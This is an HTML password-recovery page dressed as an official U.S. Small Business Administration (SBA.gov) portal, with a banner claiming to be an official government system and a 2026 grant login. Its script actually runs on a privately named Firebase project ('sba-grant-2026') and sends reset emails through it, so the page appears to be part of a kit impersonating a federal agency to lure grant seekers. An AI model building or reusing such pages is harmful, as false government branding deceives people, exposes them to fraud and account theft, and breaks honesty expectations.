
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBA Portal | Reset Access</title>
    <style>
        :root { --sba-blue: #00274c; --sba-accent: #1e3a8a; }
        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', sans-serif; }
        
        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
        .nav-header { background: var(--sba-blue); padding: 16px; text-align: center; }
        
        .container { max-width: 400px; margin: 30px auto; padding: 0 15px; }
        .card { background: white; padding: 35px 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border-top: 5px solid var(--sba-blue); }
        
        label { display: block; font-size: 11px; font-weight: 900; color: var(--sba-blue); margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
        input { width: 100%; padding: 14px; border-radius: 8px; border: 1px solid #cbd5e1; font-size: 14px; outline: none; box-sizing: border-box; margin-bottom: 20px; }
        
        .reset-btn { background: var(--sba-blue); color: white; padding: 16px; border-radius: 8px; width: 100%; font-weight: 800; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
        .reset-btn:disabled { background: #94a3b8; }

        .back-link { text-align: center; margin-top: 25px; font-size: 13px; }
        .back-link a { color: var(--sba-accent); font-weight: 700; text-decoration: none; }
    </style>
</head>
<body>

    <div class="gov-banner">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE 2026
    </div>

    <div class="nav-header">
        <h1 style="color:white; margin:0; font-size:16px; letter-spacing:2px; font-weight: 900;">SBA.GOV</h1>
    </div>

    <div class="container">
        <div class="card">
            <div style="text-align: center; margin-bottom: 25px;">
                <h2 style="color: var(--sba-blue); margin: 0; font-size: 22px;">Account Recovery</h2>
                <p style="font-size: 12px; color: #64748b; margin-top: 8px;">Retrieve your 2026 portal access.</p>
            </div>
            
            <div id="formSection">
                <label>Registered Email Address</label>
                <input type="email" id="resetEmail" placeholder="name@example.com">

                <button id="resetBtn" class="reset-btn">Send Recovery Link</button>
            </div>

            <div id="successSection" style="display: none; text-align: center;">
                <div style="font-size: 40px; margin-bottom: 15px;">üìß</div>
                <p style="font-size: 14px; color: #065f46; font-weight: 600;">Recovery Link Dispatched</p>
                <p style="font-size: 12px; color: #64748b; line-height: 1.5;">Please check your inbox and follow the secure instructions to reset your password.</p>
            </div>

            <div class="back-link">
                <a href="index.html">‚Üê Return to Login</a>
            </div>
        </div>
        
        <p style="text-align: center; font-size: 9px; color: #94a3b8; margin-top: 25px; line-height: 1.4; padding: 0 20px;">
            <b>NOTICE:</b> For security, recovery links are valid for 60 minutes. If you do not recognize this activity, please contact the Federal Help Desk immediately.
        </p>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, sendPasswordResetEmail } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
            authDomain: "sba-grant-2026.firebaseapp.com",
            projectId: "sba-grant-2026",
            storageBucket: "sba-grant-2026.firebasestorage.app",
            messagingSenderId: "838430821326",
            appId: "1:838430821326:web:6438deacb334076a64f99f"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);

        const btn = document.getElementById('resetBtn');
        const formSec = document.getElementById('formSection');
        const successSec = document.getElementById('successSection');

        btn.onclick = async () => {
            const email = document.getElementById('resetEmail').value.trim();
            if (!email) return alert("Please enter your registered email address.");

            btn.innerText = "VERIFYING...";
            btn.disabled = true;

            try {
                await sendPasswordResetEmail(auth, email);
                formSec.style.display = "none";
                successSec.style.display = "block";
            } catch (err) {
                let msg = "Could not initiate recovery. Please check the email address.";
                if (err.code === 'auth/too-many-requests') msg = "Security lockout. Please try again later.";
                
                alert("RECOVERY ERROR: " + msg);
                btn.innerText = "Send Recovery Link";
                btn.disabled = false;
            }
        };
    </script>
</body>
</html>
